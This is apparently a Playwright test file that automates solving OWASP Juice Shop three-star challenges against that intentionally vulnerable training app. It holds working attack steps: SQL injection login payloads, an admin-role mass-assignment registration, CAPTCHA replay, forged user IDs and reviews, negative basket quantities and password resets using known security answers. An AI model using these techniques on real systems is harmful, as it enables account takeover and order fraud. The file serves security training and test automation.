import { test, expect, Page } from '@playwright/test';
import { LoginPage } from '../src/pages/LoginPage';
import { RegistrationPage } from '../src/pages/RegistrationPage';
import { ResetPassword } from '../src/pages/ResetPassword';
import { SideNav } from '../src/pages/SideNav';
import { ProductsPage } from '../src/pages/ProductsPage';
import { Orders } from '../src/pages/Orders';
import { FirstVisitPopups } from '../src/pages/FirstVisitPopups';
import { ChallengeValidator } from '../src/helpers/challengeValidator';
import { TestDataGenerator } from '../src/helpers/testDataGenerator';

let page: Page;
let loginPage: LoginPage;
let registrationPage: RegistrationPage;
let resetPassword: ResetPassword;
let sideNav: SideNav;
let productsPage: ProductsPage;
let orders: Orders;
let firstVisitPopups: FirstVisitPopups;
let challengeValidator: ChallengeValidator;

test.beforeEach(async ({ page: testPage }) => {
  page = testPage;
  loginPage = new LoginPage(page);
  registrationPage = new RegistrationPage(page);
  resetPassword = new ResetPassword(page);
  sideNav = new SideNav(page);
  productsPage = new ProductsPage(page);
  orders = new Orders(page);
  firstVisitPopups = new FirstVisitPopups(page);
  challengeValidator = new ChallengeValidator(page);

  await page.goto('/');
  try {
    await firstVisitPopups.dismissAllPopups();
  } catch (e) {
    // Popups might not be present
  }
});

/**
 * OWASP JuiceShop - 3 Stars Challenges (Vulnerability Level: High)
 * These are advanced security vulnerabilities and privilege escalations
 */
test.describe('3-Stars Security Challenges', () => {
  test('1 - Admin Registration - API Manipulation', async () => {
    const userData = TestDataGenerator.generateTestUser();

    const response = await page.request.post('/api/Users/', {
      data: {
        email: userData.email,
        password: userData.password,
        role: 'admin'
      }
    });

    expect(response.status()).toBe(201);
    await challengeValidator.assertChallengeSolved('Admin Registration');
  });

  test('2 - Bjoerns Favorite Pet - Password Reset', async () => {
    const bjoernEmail = 'bjoern@owasp.org';
    const newPassword = 'newPassword123.';
    const securityAnswer = 'Zaya';

    await resetPassword.resetPassword(bjoernEmail, newPassword, securityAnswer);
    await page.waitForTimeout(1000);

    await challengeValidator.assertChallengeSolved("Bjoern's Favorite Pet");
  });

  test('3 - CAPTCHA Bypass - Multiple Submissions', async () => {
    await sideNav.navigateToCustomerFeedback();

    // Get CAPTCHA
    const captchaResponse = await page.request.get('/rest/captcha/');
    const captchaBody = await captchaResponse.json();

    // Submit multiple feedbacks with same CAPTCHA
    for (let i = 0; i < 10; i++) {
      await page.request.post('/api/Feedbacks/', {
        data: {
          captchaId: captchaBody.captchaId,
          captcha: captchaBody.answer,
          comment: 'rte (anonymous)',
          rating: 1
        }
      });
    }

    await challengeValidator.assertChallengeSolved('CAPTCHA Bypass');
  });

  test('4 - Forged Feedback - API Parameter Injection', async () => {
    await sideNav.navigateToCustomerFeedback();

    // Get CAPTCHA
    const captchaResponse = await page.request.get('/rest/captcha/');
    const captchaBody = await captchaResponse.json();

    // Submit feedback with forged UserId
    await page.request.post('/api/Feedbacks/', {
      data: {
        captchaId: captchaBody.captchaId,
        captcha: captchaBody.answer,
        comment: 'rte (anonymous)',
        rating: 1,
        UserId: 6
      }
    });

    await challengeValidator.assertChallengeSolved('Forged Feedback');
  });

  test('5 - Forged Review - Request Manipulation', async () => {
    const userData = TestDataGenerator.generateTestUser();
    
    // Register and login
    await registrationPage.register(userData);
    await loginPage.login(userData.email, userData.password);

    // Intercept product review request
    let reviewRequest: any;
    await page.route('**/rest/products/**', async (route) => {
      if (route.request().method() === 'PUT') {
        reviewRequest = route.request();
      }
      await route.continue();
    });

    // Send a review
    await productsPage.sendReview('Apple Juice (1000ml)', 'Best review ever');
    await page.waitForTimeout(1000);

    // If we have the request, forge it
    if (reviewRequest) {
      const authHeader = reviewRequest.headers()['authorization'];
      
      await page.request.put(reviewRequest.url(), {
        headers: {
          'authorization': authHeader
        },
        data: {
          author: 'admin',
          message: 'Forged Review'
        }
      });
    }

    await challengeValidator.assertChallengeSolved('Forged Review');
  });

  test('6 - Login Amy - Brute Force', async () => {
    const amyEmail = 'amy@juice-sh.op';
    const amyPassword = 'K1f.....................';

    // This password appears to be truncated in the test, but we try the known one
    await loginPage.login(amyEmail, amyPassword);
    await page.waitForTimeout(1000);

    await challengeValidator.assertChallengeSolved('Login Amy');
  });

  test('7 - Privacy Policy Inspection - Hidden Route', async () => {
    await page.goto('/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility', {
      waitUntil: 'domcontentloaded'
    });

    await challengeValidator.assertChallengeSolved('Privacy Policy Inspection');
  });

  test('8 - Login Bender - Password Reset + Login', async () => {
    const benderEmail = 'bender@juice-sh.op';
    const newPassword = 'newPassword123.';
    const securityAnswer = "Stop'n'Drop";

    await resetPassword.resetPassword(benderEmail, newPassword, securityAnswer);

    await loginPage.login(benderEmail, newPassword);
    await page.waitForTimeout(1000);

    await challengeValidator.assertChallengeSolved('Login Bender');
  });

  test('9 - Login Jim - SQL Injection', async () => {
    const jimEmail = "jim@juice-sh.op'--";
    const jimPassword = 'newPassword123.';

    await loginPage.login(jimEmail, jimPassword);
    await page.waitForTimeout(1000);

    await challengeValidator.assertChallengeSolved('Login Jim');
  });

  test('10 - Reset Jims Password', async () => {
    const jimEmail = 'jim@juice-sh.op';
    const newPassword = 'newPassword123.';
    const securityAnswer = 'Samuel';

    await resetPassword.resetPassword(jimEmail, newPassword, securityAnswer);
    await page.waitForTimeout(1000);

    await challengeValidator.assertChallengeSolved("Reset Jim's Password");
  });

  test('11 - GDPR Data Erasure - SQL Injection', async () => {
    const chrisEmail = "chris.pike@juice-sh.op'--";
    const chrisPassword = ' ';

    await loginPage.login(chrisEmail, chrisPassword);
    await page.waitForTimeout(1000);

    await challengeValidator.assertChallengeSolved('GDPR Data Erasure');
  });

  test('12 - Product Tampering - Privilege Escalation', async () => {
    const userData = TestDataGenerator.generateTestUser();

    // Register and login
    await registrationPage.register(userData);
    await loginPage.login(userData.email, userData.password);

    // Get app configuration
    const appConfigResponse = await page.request.get('/rest/admin/application-configuration');
    const appConfig = await appConfigResponse.json();

    // Add product to basket
    let authHeader: string | undefined;
    await page.route('**/api/BasketItems/**', async (route) => {
      if (route.request().method() === 'POST') {
        authHeader = route.request().headers()['authorization'];
      }
      await route.continue();
    });

    await productsPage.addToBasket();

    // Find O-Saft product and modify it
    if (appConfig.config && appConfig.config.products && authHeader) {
      const products = appConfig.config.products;
      const oSaftProduct = products.find((p: any) => p.name === 'OWASP SSL Advanced Forensic Tool (O-Saft)');

      if (oSaftProduct) {
        const productIndex = products.indexOf(oSaftProduct);
        const productId = productIndex + 1;

        await page.request.put(`/api/Products/${productId}`, {
          headers: {
            'authorization': authHeader
          },
          data: {
            description: '<a href="https://owasp.slack.com" target="_blank">More...</a>'
          }
        });
      }
    }

    await challengeValidator.assertChallengeSolved('Product Tampering');
  });

  test('13 - Payback Time - Negative Price', async () => {
    const userData = TestDataGenerator.generateTestUser();

    // Register and login
    await registrationPage.register(userData);
    await loginPage.login(userData.email, userData.password);

    // Add address
    await orders.addNewAddress();
    await page.goto('/');

    // Add product to basket and intercept the request
    let basketItemRequest: any;
    await page.route('**/api/BasketItems/**', async (route) => {
      if (route.request().method() === 'POST') {
        basketItemRequest = route.request();
      }
      await route.continue();
    });

    await productsPage.addToBasket();

    // Get basket and modify quantity to negative
    let authHeader: string | undefined;
    const basketResponse = await page.request.get('/rest/basket/');
    const basketData = await basketResponse.json();

    if (basketData.data && basketData.data.Products && basketData.data.Products.length > 0) {
      authHeader = basketResponse.headers()['authorization'] || 
                  basketItemRequest?.headers()['authorization'];
      const basketItemId = basketData.data.Products[0].BasketItem.id;

      if (authHeader) {
        await page.request.put(`/api/BasketItems/${basketItemId}`, {
          headers: { 'authorization': authHeader },
          data: { quantity: -99 }
        });
      }
    }

    // Place order
    await page.reload();
    await orders.placeOrder();

    await challengeValidator.assertChallengeSolved('Payback Time');
  });

  test('14 - Deluxe Fraud - Invalid Payment Mode', async () => {
    const userData = TestDataGenerator.generateTestUser();

    // Register and login
    await registrationPage.register(userData);
    await loginPage.login(userData.email, userData.password);

    // Add product to basket and intercept for auth header
    let authHeader: string | undefined;
    await page.route('**/api/BasketItems/**', async (route) => {
      if (route.request().method() === 'POST') {
        authHeader = route.request().headers()['authorization'];
      }
      await route.continue();
    });

    await productsPage.addToBasket();

    // Try to upgrade to deluxe with invalid payment
    if (authHeader) {
      await page.request.post('/rest/deluxe-membership', {
        headers: { 'authorization': authHeader },
        data: { paymentMode: 'candies' }
      });
    }

    await challengeValidator.assertChallengeSolved('Deluxe Fraud');
  });
});
